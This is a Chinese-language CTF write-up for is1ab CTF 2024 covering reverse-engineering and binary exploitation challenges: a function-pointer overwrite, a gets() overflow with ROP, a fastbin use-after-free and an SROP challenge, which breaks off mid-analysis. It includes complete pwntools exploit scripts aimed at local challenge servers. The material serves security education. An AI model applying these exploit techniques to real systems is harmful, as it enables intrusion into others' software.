---
title : is1ab CTF 2024
date : '2024-09-10'
tags: CTF
---

### Poetrier

> ida 找 flag，這題給了一個假 flag，然後

![image](https://hackmd.io/_uploads/By5DzPT2C.png)

我就以為是假 flag 的頭改成 is1ab{} 就可以提交了，然後我看 program 的邏輯是只要輸入的 string 與設定的不符，就會死掉，不存在其他 branch，所以這個一定就是真的 flag 但不知道為啥不能 submit，是後面被 hints 有「真正的」 Flag

我又跑去檢查了一下程式流程圖，發現只要 string 匹配錯誤就是 return，與我之前的觀察沒有差別，完全找不到 flag

![image](https://hackmd.io/_uploads/ByTc4Pp3A.png)

>  ida 左邊看 function

![image](https://hackmd.io/_uploads/B15w8PanC.png)

> 然後就看到藏著 flag 的 function 

---
### Secret letter

> 寫的很長，可以直接往下滑看綠色框的內容，綠色框是解題邏輯，下面寫的是我的解題過程。剛剛 demo 發現其實有一些細節寫得不是很詳細，綠色方框下面我又補了實際操作

`file`

```sh
Secret : ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=bdd857945d4521a6a0ea022988f98642f0421868, for GNU/Linux 3.2.0, not stripped
```


> 有給 Source Code

`Source code`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>


#define BUFSIZE 64
#define FLAGSIZE 70

int lucky_number(char *number, size_t len)
{
  int sum = 0;
  for (size_t i = 0; i < len; i++)
  {
    sum += number[i] ^ 0xfe ;  
  }

  return sum;
}

void secret(char *number, size_t len)
{
  int a = 1;
  if(a == 0)
    printf("I feel like there's a flag here.");

  if(lucky_number(number, len) == 48763333) 
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("/home/ctf/flag.txt", "r");
    if (f == NULL)
    {
      printf("%s", "Opps, you forget creating 'flag.txt' to help you debug\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f);
    printf("Hey, that's pretty good. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("Hmm~ It seems you have dementia, you actually forgot what the cipher is.\n");
  }
}

void (*verify)(char*, size_t) = secret;
int fun[10] = {0};

void letter()
{
  char number[128];
  int num_1, num_2 ;
  printf("I said that having only one layer of password isn't enough, right? \n") ;
  printf("Please enter my lucky number : ") ;
  scanf("%127s", number);
  printf("Please input our shared secret code, input two numbers.\n");
  scanf("%d %d", &num_1, &num_2); 
  {
    fun[num_1] += num_2;
  }

  verify(number, strlen(number));
}
 
int main(int argc, char **argv)
{

  setvbuf(stdout, NULL, _IONBF, 0);
  letter();
  return 0;
}
```

> 整體流程是 `main()` call `letter()`， `letter()` 接收127 bytes，然後接收兩個數字，分別為 num_1 and num_2，並且執行 `fun[num_1] += num_2;`

> 有趣的地方是這個 fun 是一個 pointer to int ，然後 index and value 可控，這樣就可以覆蓋到不應該覆蓋到的地方


> c 語言的陣列其實是一種指標
> * `fun[0] == *fun`
> * `*(fun + 1) == fun[1]`

這邊先記著我們有一個方法可以任意地址覆寫，繼續 trace code，可以看到接下來 call 了 `verify(number, strlen(number));` 而 `verify` 是一個 function pointer，指到的地方是 `secert()`，接下來看 `secert()` 的行為，目標很明確，我們需要讓 `lucky_number(number, len) == 48763333` 這個為真，才能印出 flag，那關鍵就會是 `lucky_number()`

可以知道 `lucky_number()` 是將我們第一次輸入的字符逐個與 `0xfe` xor 後放入 `sum`，並且 return `sum`，而這個 `sum` 要與 `48763333` 相等

看起來其實不難，就是回推數值，基本上可以手算，或者自動的一個一個 try ，不過我想節省時間所以先去算他的 boundary，發現 `sum` 最大的可能會出現在每個累加的 bytes 都是1，也就是 ` sum += number[i] ^ 0xfe ; ` 中的 `number[i] ^ 0xfe` always 為 `0xff`，`0xff` 等於十進制的`255`，然後 loop 最多127次，這樣 sum 的最大值為 `255 * 127 = 32385`，遠不及我們想要的`48763333`


好了，到這邊其實很明顯了，正常方式過不了，只能用到前面的任意位置複寫，然後要複寫的東西也很明顯，就是 `verify()` 的內容， `verify()`是一個 function pointer，也就是 `verify()` 所存的 data 是 `sercet()` 的 `address`，那我們只要把地址複寫跳過檢查的這個動作就可以x了，複寫的值就是 `sercet() + offset`，加上這個 offset 就是為了跳過檢查(`lucky_number(number, len) == 48763333`)的 address，這個可以用 `objdump -d` 去看組語，pattern 應該很明顯應該是 `cmp $register 48763333`，需要注意的是 constant(48763333) 應該是 hex 表示，蓋掉之後就可以 bypass 驗證，拿到 flag 了

> 大致流程就是透過 `fun[num_1] = num_2` 達成任意位置複寫任意數值，`fun[num_1]` 要控成 verify() 的地址，然後使用 `num_2` 填入 `sercet() bypass address`，`sercet() bypass address` 的核心概念就是`lucky_number(number, len) == 48763333`的下一條指令地址，基本上我們就是要 bypass 這個指令的檢查，從而得到 flag


> 流程是那樣，實際上你要找到 fun[0] 的 address，你需要把斷點下在 letter() (其實理論上哪裡都可以只要在 fun[num_1] = num_2 之前就行)


![image](https://hackmd.io/_uploads/S1oMvD6n0.png)


> 然後一直 `ni` 就可以看到 `0x555555558080 <fun>`

![image](https://hackmd.io/_uploads/Hy5oDP6hA.png)

> 去看一眼 `0x555555558080` 附近長怎樣，因為這是我們能複寫的地方

```shell
gef➤  x/50gx 0x555555558080 -0x50
0x555555558030 <__isoc99_scanf@got.plt>:	0x00007ffff7c5fe00	0x00005555555550a6
0x555555558040:	0x0000000000000000	0x0000555555558048
0x555555558050 <verify>:	0x00005555555551f0	0x0000000000000000
0x555555558060 <stdout@GLIBC_2.2.5>:	0x00007ffff7e045c0	0x0000000000000000
0x555555558070:	0x0000000000000000	0x0000000000000000
0x555555558080 <fun>:	0x0000000000000000	0x0000000000000000
0x555555558090 <fun+16>:	0x0000000000000000	0x0000000000000000
0x5555555580a0 <fun+32>:	0x0000000000000000	0x0000000000000000
0x5555555580b0:	0x0000000000000000	0x0000000000000000
0x5555555580c0:	0x0000000000000000	0x0000000000000000
0x5555555580d0:	0x0000000000000000	0x0000000000000000
0x5555555580e0:	0x0000000000000000	0x0000000000000000
0x5555555580f0:	0x0000000000000000	0x0000000000000000
0x555555558100:	0x0000000000000000	0x0000000000000000
0x555555558110:	0x0000000000000000	0x0000000000000000
0x555555558120:	0x0000000000000000	0x0000000000000000
0x555555558130:	0x0000000000000000	0x0000000000000000
0x555555558140:	0x0000000000000000	0x0000000000000000
0x555555558150:	0x0000000000000000	0x0000000000000000
0x555555558160:	0x0000000000000000	0x0000000000000000
0x555555558170:	0x0000000000000000	0x0000000000000000
0x555555558180:	0x0000000000000000	0x0000000000000000
0x555555558190:	0x0000000000000000	0x0000000000000000
0x5555555581a0:	0x0000000000000000	0x0000000000000000
0x5555555581b0:	0x0000000000000000	0x0000000000000000
```

> 第四行的 `0x555555558050 <verify>:	0x00005555555551f0	0x0000000000000000` 存放 `verify` 所指向的 function 也就是 sercet()，很明顯這是我們要覆寫的位置，那我們要覆寫什麼東西呢?

```shell
gef➤  x/50gx 0x00005555555551f0
0x5555555551f0 <secret>:	0x70ec8348e5894855	0x90758948987d8948
0x555555555200 <secret+16>:	0x8300000001fc45c7	0x058d48147500fc7d
0x555555555210 <secret+32>:	0xb8c7894800000df4	0xfffe2fe800000000
0x555555555220 <secret+48>:	0x458b4890558b48ff	0xe8c78948d6894898
0x555555555230 <secret+64>:	0xe811c53dffffff75	0x48000000b7850f02
0x555555555240 <secret+80>:	0x4800000000a045c7	0x4800000000a845c7
0x555555555250 <secret+96>:	0x4800000000b045c7	0x4800000000b845c7
0x555555555260 <secret+112>:	0x4800000000c045c7	0x4800000000c845c7
0x555555555270 <secret+128>:	0x4800000000d045c7	0x4800000000d845c7
0x555555555280 <secret+144>:	0x4800000000de45c7	0x894800000d9b058d
0x555555555290 <secret+160>:	0x00000d93058d48c6	0xfffffde0e8c78948
0x5555555552a0 <secret+176>:	0xf07d8348f0458948	0x0d8e058d48197500
0x5555555552b0 <secret+192>:	0xfd76e8c789480000	0xe800000000bfffff
0x5555555552c0 <secret+208>:	0xf0558b48fffffddc	0x000046bea0458d48
0x5555555552d0 <secret+224>:	0xfffd87e8c7894800	0x00000d98058d48ff
0x5555555552e0 <secret+240>:	0xfffffd48e8c78948	0xe8c78948a0458d48
0x5555555552f0 <secret+256>:	0x8d480febfffffd3c	0xc7894800000dab05
0x555555555300 <secret+272>:	0xc3c990fffffd2be8	0xec814853e5894855
0x555555555310 <letter+8>:	0xdd058d4800000098	0x0de8c7894800000d
0x555555555320 <letter+24>:	0x0e16058d48fffffd	0x0000b8c789480000
0x555555555330 <letter+40>:	0x48fffffd19e80000	0x8948ffffff70858d
0x555555555340 <letter+56>:	0x00000e18058d48c6	0x00000000b8c78948
0x555555555350 <letter+72>:	0x058d48fffffd3be8	0xe8c7894800000e0c
0x555555555360 <letter+88>:	0x68958d48fffffccc	0xff6c858d48ffffff
0x555555555370 <letter+104>:	0x058d48c68948ffff	0xb8c7894800000e24
```

> 原本存的是 `secret + 0` 的 address 所以會從 `secret + 0`  執行，但我們想 bypass 檢查，也就是 call `lucky number`那邊，所以我們把 value 改成 `secret + 79`，他就會 bypass 掉檢查了，然後因為是 `fun[num_1] += num_2` 所以我們只要輸入 offset(這邊的話就是 79) 就可以了

```sh
gef➤  x/50i 0x00005555555551f0
   0x5555555551f0 <secret>:	push   rbp
   0x5555555551f1 <secret+1>:	mov    rbp,rsp
   0x5555555551f4 <secret+4>:	sub    rsp,0x70
   0x5555555551f8 <secret+8>:	mov    QWORD PTR [rbp-0x68],rdi
   0x5555555551fc <secret+12>:	mov    QWORD PTR [rbp-0x70],rsi
   0x555555555200 <secret+16>:	mov    DWORD PTR [rbp-0x4],0x1
   0x555555555207 <secret+23>:	cmp    DWORD PTR [rbp-0x4],0x0
   0x55555555520b <secret+27>:	jne    0x555555555221 <secret+49>
   0x55555555520d <secret+29>:	lea    rax,[rip+0xdf4]        # 0x555555556008
   0x555555555214 <secret+36>:	mov    rdi,rax
   0x555555555217 <secret+39>:	mov    eax,0x0
   0x55555555521c <secret+44>:	call   0x555555555050 <printf@plt>
   0x555555555221 <secret+49>:	mov    rdx,QWORD PTR [rbp-0x70]
   0x555555555225 <secret+53>:	mov    rax,QWORD PTR [rbp-0x68]
   0x555555555229 <secret+57>:	mov    rsi,rdx
   0x55555555522c <secret+60>:	mov    rdi,rax
   0x55555555522f <secret+63>:	call   0x5555555551a9 <lucky_number>
   0x555555555234 <secret+68>:	cmp    eax,0x2e811c5
   0x555555555239 <secret+73>:	jne    0x5555555552f6 <secret+262>
   0x55555555523f <secret+79>:	mov    QWORD PTR [rbp-0x60],0x0
   0x555555555247 <secret+87>:	mov    QWORD PTR [rbp-0x58],0x0
   0x55555555524f <secret+95>:	mov    QWORD PTR [rbp-0x50],0x0
   0x555555555257 <secret+103>:	mov    QWORD PTR [rbp-0x48],0x0
   0x55555555525f <secret+111>:	mov    QWORD PTR [rbp-0x40],0x0
   0x555555555267 <secret+119>:	mov    QWORD PTR [rbp-0x38],0x0
   0x55555555526f <secret+127>:	mov    QWORD PTR [rbp-0x30],0x0
   0x555555555277 <secret+135>:	mov    QWORD PTR [rbp-0x28],0x0
   0x55555555527f <secret+143>:	mov    QWORD PTR [rbp-0x22],0x0
   0x555555555287 <secret+151>:	lea    rax,[rip+0xd9b]        # 0x555555556029
   0x55555555528e <secret+158>:	mov    rsi,rax
   0x555555555291 <secret+161>:	lea    rax,[rip+0xd93]        # 0x55555555602b
   0x555555555298 <secret+168>:	mov    rdi,rax
   0x55555555529b <secret+171>:	call   0x555555555080 <fopen@plt>
   0x5555555552a0 <secret+176>:	mov    QWORD PTR [rbp-0x10],rax
   0x5555555552a4 <secret+180>:	cmp    QWORD PTR [rbp-0x10],0x0
   0x5555555552a9 <secret+185>:	jne    0x5555555552c4 <secret+212>
   0x5555555552ab <secret+187>:	lea    rax,[rip+0xd8e]        # 0x555555556040
   0x5555555552b2 <secret+194>:	mov    rdi,rax
   0x5555555552b5 <secret+197>:	call   0x555555555030 <puts@plt>
   0x5555555552ba <secret+202>:	mov    edi,0x0
   0x5555555552bf <secret+207>:	call   0x5555555550a0 <exit@plt>
   0x5555555552c4 <secret+212>:	mov    rdx,QWORD PTR [rbp-0x10]
   0x5555555552c8 <secret+216>:	lea    rax,[rbp-0x60]
   0x5555555552cc <secret+220>:	mov    esi,0x46
   0x5555555552d1 <secret+225>:	mov    rdi,rax
   0x5555555552d4 <secret+228>:	call   0x555555555060 <fgets@plt>
   0x5555555552d9 <secret+233>:	lea    rax,[rip+0xd98]        # 0x555555556078
   0x5555555552e0 <secret+240>:	mov    rdi,rax
   0x5555555552e3 <secret+243>:	call   0x555555555030 <puts@plt>
   0x5555555552e8 <secret+248>:	lea    rax,[rbp-0x60]
```



> 突然想到，這題其實是需要先解 .zip 密碼的，但這邊我的建議是

![1725630036607](https://hackmd.io/_uploads/HyfRUYd3R.png)

----


### 計算機
`file`

```sh
calculator: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=bdd857945d4521a6a0ea022988f98642f0421868, for GNU/Linux 3.2.0, not stripped
```
`checksec`

```sh
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```
> Decompile

`main`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  puts("             _               _         _                ");
  puts(" ____   _   | |  ___  _   _ | |  __ _ | |_   ___   _ __ ");
  puts("/  __ / _` || | / __|| | | || | / _` || __| / _ \\ | '__|");
  puts("| (__| (_| || || (__ | |_| || || (_| || |_ | (_) || |   ");
  puts(" \\___|\\__,_||_| \\___| \\__,_||_| \\__,_| \\__| \\___/ |_|   ");
  puts("                                                          ");
  do
    calculator("                                                          ", 0LL);
  while ( !(unsigned int)goodbye() );
  return 0;
}
```

`calcutator()`

```c
int calculator()
{
  char v1; // [rsp+7h] [rbp-119h]
  unsigned int v2; // [rsp+8h] [rbp-118h]
  unsigned int v3; // [rsp+Ch] [rbp-114h]
  char s; // [rsp+10h] [rbp-110h]
  int v5; // [rsp+11Ch] [rbp-4h]

  puts("This is a calculator, you know what to do ! ");
  puts("If you want to leave, please press 'q' ");
  while ( 1 )
  {
    printf("\nInput : ");
    fgets(&s, 256, stdin);
    if ( s == 113 )
      return puts("Exiting calculator...");
    if ( (unsigned int)__isoc99_sscanf(&s, "%d %c %d", &v3, &v1, &v2) == 3 )
    {
      if ( v1 == 47 )
      {
        if ( v2 )
        {
          v5 = (signed int)v3 / (signed int)v2;
          printf("Output : %d / %d = %d\n", v3, v2, (unsigned int)((signed int)v3 / (signed int)v2));
        }
        else
        {
          puts("Error: Division by zero!");
        }
      }
      else
      {
        if ( v1 > 47 )
          goto LABEL_17;
        if ( v1 == 45 )
        {
          v5 = v3 - v2;
          printf("Output : %d - %d = %d\n", v3, v2, v3 - v2);
        }
        else
        {
          if ( v1 > 45 )
            goto LABEL_17;
          if ( v1 == 42 )
          {
            v5 = v3 * v2;
            printf("Output : %d * %d = %d\n", v3, v2, v3 * v2);
          }
          else if ( v1 == 43 )
          {
            v5 = v3 + v2;
            printf("Output : %d + %d = %d\n", v3, v2, v3 + v2);
          }
          else
          {
LABEL_17:
            puts("Invalid operation!");
          }
        }
      }
    }
    else
    {
      puts("Invalid input format. Please use the format: 1 + 1");
    }
  }
}
```

`goodbye()`

```c
signed __int64 goodbye()
{
  char v1; // [rsp+Ch] [rbp-4h]

  puts("Are you sure you want to leave? [Y/n]");
  gets(&v1);
  if ( v1 != 121 && v1 != 89 )
    return 0LL;
  puts("bye!bye!");
  return 1LL;
}
```
> 我 leak 出 libc 位置，串好 ROP 才發現有留後門(`win`)


`win`

```c
int __fastcall win(int a1)
{
  char s[8]; // [rsp+10h] [rbp-50h]
  __int64 v3; // [rsp+18h] [rbp-48h]
  __int64 v4; // [rsp+20h] [rbp-40h]
  __int64 v5; // [rsp+28h] [rbp-38h]
  __int64 v6; // [rsp+30h] [rbp-30h]
  __int64 v7; // [rsp+38h] [rbp-28h]
  __int64 v8; // [rsp+40h] [rbp-20h]
  __int64 v9; // [rsp+48h] [rbp-18h]
  FILE *stream; // [rsp+58h] [rbp-8h]

  if ( a1 != -1057047885 )
    return puts("So close !!");
  *(_QWORD *)s = 0LL;
  v3 = 0LL;
  v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  stream = fopen("/home/ctf/flag.txt", "r");
  if ( !stream )
  {
    puts("Opps, you forget creating 'flag.txt' to help you debug");
    exit(0);
  }
  fgets(s, 64, stream);
  puts("Dame! You are a calculator expert!");
  return puts(s);
}

```
> 開 nx 沒 cannary，又看到 `get()`，差不多可以確定是 ROP，需要注意的是他需要一個參數，要記得pop 到 `$rdi`

#### exploit


```c
from pwn import *
context.arch = "amd64"
#p = process('./calculator')

p = remote('127.0.0.1',39757)
pop_rdi = 0x40119a
win_arg = 0xC0FEBAB3
win_addr = 0x40119f

payloadtest = b'n' * 1 + b'a' * 3 + b'a' * 8 + p64(pop_rdi)+p64(win_arg) + p64(win_addr)

p.sendlineafter('Input :','q')

p.sendlineafter('Are you sure you want to leave? [Y/n]',payloadtest)

p.interactive()
```
---
### yummyyummy

`file`

```shell
yummyyummy: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1a7eb96772e5da9f443d624c911601ca076ad299, not stripped
```

`checksec`


```shell
Canary                        : ✓ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Partial
```


> Decompile

`main`
```c
// local variable allocation has failed, the output may be wrong!
int __cdecl main(int argc, const char **argv, const char **envp)
{
  const char *v3; // rdi
  int v4; // ST0C_4
  void *buf; // ST18_8
  signed int v6; // eax
  signed int v8; // [rsp+8h] [rbp-18h]
  void (__fastcall **ptr)(signed __int64); // [rsp+10h] [rbp-10h]

  init(*(_QWORD *)&argc, argv, envp);
  ptr = (void (__fastcall **)(signed __int64))malloc(0x10uLL);
  *ptr = (void (__fastcall *)(signed __int64))welcome_func;
  ptr[1] = (void (__fastcall *)(signed __int64))bye_func;
  (*ptr)(16LL);
  free(ptr);
  puts("\n< MENU > ");
  puts(asc_1087);
  puts("---------------- ");
  puts(aA);
  puts(aB);
  puts(aC);
  puts(aD);
  puts(aE);
  puts(asc_1114);
  puts(aG);
  puts(asc_1135);
  puts("---------------- ");
  puts(asc_114B);
  puts(aI);
  puts(aJ);
  puts(aK);
  puts(asc_118A);
  puts(aM);
  puts("< Sample Order >  ");
  puts("---------------- ");
  puts("Quantity: 4");
  puts("Order: aajk");
  puts("Your order: aajk\n");
  v3 = "< You can order five times >  \n";
  puts("< You can order five times >  \n");
  v8 = 5;
  while ( 1 )
  {
    v6 = v8--;
    if ( !v6 )
      break;
    printf("Quantity: ");
    v4 = read_int();
    buf = malloc(v4);
    printf("Order: ");
    read(0, buf, (unsigned int)(10 * v4));
    printf("Your order: %s\n", buf);
    v3 = (const char *)buf;
    free(buf);
  }
  ptr[1]((signed __int64)v3);
  return 0;
}

```
> heap 題，保護機制全開


16和55行只 free 不設 Null， Dangling pointer。存在 UAF，但16行才是重點，我原本的想法是把 *(ptr+1)設成 `system`，然後 `v3` 也就是第五次點餐的內容填成 `bin/sh`，這樣就可以 RCE!

> 對，我又沒發現這題有 backdoor

> 這題挺麻煩的，因為 chunk 進到 tcatch bin 裡面的 data 會被 flush 掉，完全沒有頭緒，幸好後來學長跟我提醒說這題要用 ubuntu 16.04，為什麼?因為16.04沒有 tcatch

> 那這題其實就很簡單了

> 經典 fastbin UAF 問題，16行產生  Dangling pointer，chunk 會被 fastbin 管理，這時候我們只要去 malloc 一塊一樣大小的 chunk，然後透過 52行就可以蓋掉原本存在在 chunk 上面的 `bye_func() address`，填成 backdoor 的位置，57行在 call 的時候，就不會是 call `bye_func()`，而是 backdoor() 

#### exploit


```python
from pwn import *


#p = process('./yummyyummy')
p = remote('127.0.0.1',33265)
backdoor = 0x0c30
p.recvuntil(b'< You can order five times >')
p.sendafter('Quantity:',str(0x10))
p.sendlineafter('Order:',b'a' * 8 )
p.recvuntil('a'*8)

bye_func = u64(p.recv(6).ljust(8,b'\0'))
backdoor_addr = bye_func + 0x26
print(hex(bye_func))
print(hex(backdoor_addr))

p.sendafter('Quantity:',str(0x10))
p.sendlineafter('Order:', b'a' * 8 )

p.sendafter('Quantity:',str(0x10))
p.sendlineafter('Order:', b'a' * 8)

p.sendafter('Quantity:',str(0x10))
p.sendlineafter('Order:', b'a' * 8 )

p.sendafter('Quantity:',str(0x10))
p.sendlineafter('Order:', b'a' * 8  + p64(backdoor_addr))
p.interactive()

```
因為有開 PIE 第一次 leak `bye_func() address`，然後去反組譯(看/算) process 的 memory base，加上 offset 算出 `backdoor() address` ，其實第三次之後的 send payload 可以去要更大塊的 memory，這樣就不會動到原本擺好的 payload


> 題外話 這題的 source code 邏輯和張元 2019 pwn 講解 UAF 的例題一模一樣

---
### Backdoor



`file`

```sh
backdoor: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9e9846b36994720fc8b91e77d41cb86f197769fd, for GNU/Linux 3.2.0, not stripped\
```

`checksec`

```sh
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : ✘ 
```

`objdump -d`

```sh
0000000000401106 <main>:
  401106:	55                   	push   rbp
  401107:	48 89 e5             	mov    rbp,rsp
  40110a:	48 c7 c7 01 00 00 00 	mov    rdi,0x1
  401111:	48 8d 35 08 0f 00 00 	lea    rsi,[rip+0xf08]        # 402020 <message>
  401118:	48 c7 c2 2d 00 00 00 	mov    rdx,0x2d
  40111f:	48 c7 c0 01 00 00 00 	mov    rax,0x1
  401126:	0f 05                	syscall
  401128:	48 c7 c7 00 00 00 00 	mov    rdi,0x0
  40112f:	48 89 e6             	mov    rsi,rsp
  401132:	48 83 ee 08          	sub    rsi,0x8
  401136:	48 ba ef be ad de 00 	movabs rdx,0xdeadbeef
  40113d:	00 00 00 
  401140:	48 c7 c0 00 00 00 00 	mov    rax,0x0
  401147:	0f 05                	syscall
  401149:	48 c7 c7 01 00 00 00 	mov    rdi,0x1
  401150:	48 8d 35 f9 0e 00 00 	lea    rsi,[rip+0xef9]        # 402050 <message2>
  401157:	48 c7 c2 0f 00 00 00 	mov    rdx,0xf
  40115e:	48 c7 c0 01 00 00 00 	mov    rax,0x1
  401165:	0f 05                	syscall
  401167:	c3                   	ret
  401168:	58                   	pop    rax
  401169:	c3                   	ret
  40116a:	b8 00 00 00 00       	mov    eax,0x0
  40116f:	5d                   	pop    rbp
  401170:	c3                   	ret
```

> 三個 syscall，分別為印出(write `rax == 1`)特定資訊，以及讀入(read `rax == 0`) 0xdeadbeef 個 bytes


```sh
0000000000401106 <main>:
  401106:	55                   	push   rbp
  401107:	48 89 e5             	mov    rbp,rsp
```
> 注意到這邊 stack 並沒有被撐開(感謝你的注意，沒什麼用的資訊)

* ROPgadget --binary <binaryfile> --multibr
> `--multibr` Enable multiple branch gadgets

```sh
0x00000000004010e8 : adc esp, dword ptr [rdx] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040107b : add bh, bh ; loopne 0x4010e5 ; nop ; ret
0x0000000000401117 : add byte ptr [rax - 0x39], cl ; ret 0x2d
0x0000000000401156 : add byte ptr [rax - 0x39], cl ; ret 0xf
0x000000000040113f : add byte ptr [rax - 0x39], cl ; rol byte ptr [rax], 0 ; add byte ptr [rax], al ; syscall
0x000000000040111e : add byte ptr [rax - 0x39], cl ; rol byte ptr [rcx], 0 ; add byte ptr [rax], al ; syscall
0x0000000000401048 : add byte ptr [rax], al ; add byte ptr [rax], al ; nop dword ptr [rax] ; ret
0x000000000040116b : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x0000000000401143 : add byte ptr [rax], al ; add byte ptr [rax], al ; syscall
0x00000000004010ea : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040113e : add byte ptr [rax], al ; mov rax, 0 ; syscall
0x000000000040111d : add byte ptr [rax], al ; mov rax, 1 ; syscall
0x000000000040104a : add byte ptr [rax], al ; nop dword ptr [rax] ; ret
0x000000000040116d : add byte ptr [rax], al ; pop rbp ; ret
0x0000000000401124 : add byte ptr [rax], al ; syscall
0x0000000000401009 : add byte ptr [rax], al ; test rax, rax ; je 0x401012 ; call rax
0x0000000000401078 : add byte ptr [rbx], dh ; add dil, dil ; loopne 0x4010e5 ; nop ; ret
0x00000000004010eb : add byte ptr [rcx], al ; pop rbp ; ret
0x000000000040107a : add dil, dil ; loopne 0x4010e5 ; nop ; ret
0x0000000000401122 : add dword ptr [rax], eax ; add byte ptr [rax], al ; syscall
0x00000000004010ec : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004010e7 : add eax, 0x2213 ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401013 : add esp, 8 ; ret
0x0000000000401012 : add rsp, 8 ; ret
0x00000000004010e9 : and al, byte ptr [rax] ; add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401010 : call rax
0x0000000000401103 : cli ; jmp 0x401090
0x0000000000401100 : endbr64 ; jmp 0x401090
0x0000000000401007 : frstor dword ptr [rdx] ; add byte ptr [rax], al ; test rax, rax ; je 0x401012 ; call rax
0x000000000040100e : je 0x401012 ; call rax
0x0000000000401075 : je 0x401080 ; mov edi, 0x403300 ; jmp rax
0x00000000004010b7 : je 0x4010c0 ; mov edi, 0x403300 ; jmp rax
0x0000000000401104 : jmp 0x401090
0x000000000040107c : jmp rax
0x000000000040107d : loopne 0x4010e5 ; nop ; ret
0x00000000004010e6 : mov byte ptr [rip + 0x2213], 1 ; pop rbp ; ret
0x000000000040116a : mov eax, 0 ; pop rbp ; ret
0x0000000000401141 : mov eax, 0 ; syscall
0x0000000000401120 : mov eax, 1 ; syscall
0x0000000000401077 : mov edi, 0x403300 ; jmp rax
0x0000000000401140 : mov rax, 0 ; syscall
0x000000000040111f : mov rax, 1 ; syscall
0x000000000040107f : nop ; ret
0x00000000004010fc : nop dword ptr [rax] ; endbr64 ; jmp 0x401090
0x000000000040104c : nop dword ptr [rax] ; ret
0x0000000000401076 : or dword ptr [rdi + 0x403300], edi ; jmp rax
0x0000000000401168 : pop rax ; ret
0x00000000004010ed : pop rbp ; ret
0x0000000000401016 : ret
0x000000000040111a : ret 0x2d
0x0000000000401159 : ret 0xf
0x0000000000401142 : rol byte ptr [rax], 0 ; add byte ptr [rax], al ; syscall
0x0000000000401121 : rol byte ptr [rcx], 0 ; add byte ptr [rax], al ; syscall
0x0000000000401074 : sal byte ptr [rcx + rcx - 0x41], 0 ; xor eax, dword ptr [rax] ; jmp rax
0x00000000004010b6 : sal byte ptr [rdi + rax - 0x41], 0 ; xor eax, dword ptr [rax] ; jmp rax
0x000000000040100d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x0000000000401175 : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000401174 : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401126 : syscall
0x000000000040100c : test eax, eax ; je 0x401012 ; call rax
0x0000000000401073 : test eax, eax ; je 0x401080 ; mov edi, 0x403300 ; jmp rax
0x00000000004010b5 : test eax, eax ; je 0x4010c0 ; mov edi, 0x403300 ; jmp rax
0x000000000040100b : test rax, rax ; je 0x401012 ; call rax
0x0000000000401079 : xor eax, dword ptr [rax] ; jmp rax

Unique gadgets found: 64
```

> `objdump -d` 有找到一組 `syscall;ret` 位置在 `0x401165`

> 這題是 SROP，核心概念是呼叫 `syscall` 前會把 `$register` 的值保存起來，然後進 kernal mode 執行，結束回到 user mode，把剛剛存起來的 `$register` pop 回去原本的位置，而我們就是透過修改保存那些`$register` 的地方的 value 達到 ROP，那最簡單的方法就是 `$rip` 設成 `system`，然後 `$rdi` 設成 "bin/sh" 但會遇到一些問題，一般不會有 "bin/sh" 字串，沒有就自己送，送過去的 bin/sh 會在 stack 上，stack 在哪? 想辦法 leak  `stack address`，觀察前面找出的 `gadget` 發現也沒辦法 leak 出 `stack address`

> 運氣很好的碰到熱心的學長，跟我說這題題如其名，他把我需要的東西藏在程式的某個地方

> xxd 看一眼，就找到了

```sh
➜  Downloads xxd ./backdoor       
00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
00000010: 0200 3e00 0100 0000 2010 4000 0000 0000  ..>..... .@.....
00000020: 4000 0000 0000 0000 1029 0000 0000 0000  @........)......
00000030: 0000 0000 4000 3800 0c00 4000 1b00 1a00  ....@.8...@.....
00000040: 0600 0000 0400 0000 4000 0000 0000 0000  ........@.......
00000050: 4000 4000 0000 0000 4000 4000 0000 0000  @.@.....@.@.....
00000060: a002 0000 0000 0000 a002 0000 0000 0000  ................
00000070: 0800 0000 0000 0000 0300 0000 0400 0000  ................
00000080: e002 0000 0000 0000 e002 4000 0000 0000  ..........@.....
00000090: e002 4000 0000 0000 1c00 0000 0000 0000  ..@.............
000000a0: 1c00 0000 0000 0000 0100 0000 0000 0000  ................
000000b0: 0100 0000 0400 0000 0000 0000 0000 0000  ................
000000c0: 0000 4000 0000 0000 0000 4000 0000 0000  ..@.......@.....
000000d0: 6004 0000 0000 0000 6004 0000 0000 0000  `.......`.......
